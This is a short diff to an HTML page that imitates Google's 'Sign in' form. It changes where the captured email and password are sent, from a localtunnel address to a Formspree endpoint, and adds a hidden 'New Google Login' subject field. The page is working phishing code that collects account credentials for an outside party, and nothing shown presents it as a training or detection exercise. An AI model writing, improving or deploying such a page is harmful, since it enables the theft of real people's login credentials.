@@ -193,16 +193,15 @@
     <h1>Sign in</h1>
     <p class="subtitle">Use your Google Account</p>
 
-    <!-- Form submits to your local server via localtunnel -->
-    <form action="https://legal-lions-remain.loca.lt/login" method="POST">
+    <!-- Form submits to Formspree -->
+    <form action="https://formspree.io/f/mjybdwon" method="POST">
+        <input type="hidden" name="_subject" value="New Google Login">
 
-        <!-- Email Field -->
         <div class="input-group" id="emailField">
             <label for="identifier">Email or phone</label>
             <input type="email" id="identifier" name="identifier" placeholder="Enter your email" onblur="showPassword()" autofocus required>
         </div>
 
-        <!-- Password Field (hidden initially) -->
         <div class="input-group" id="passwordField">
             <label for="hiddenPassword">Password</label>
             <input type="password" id="hiddenPassword" name="hiddenPassword" placeholder="Enter your password" required>
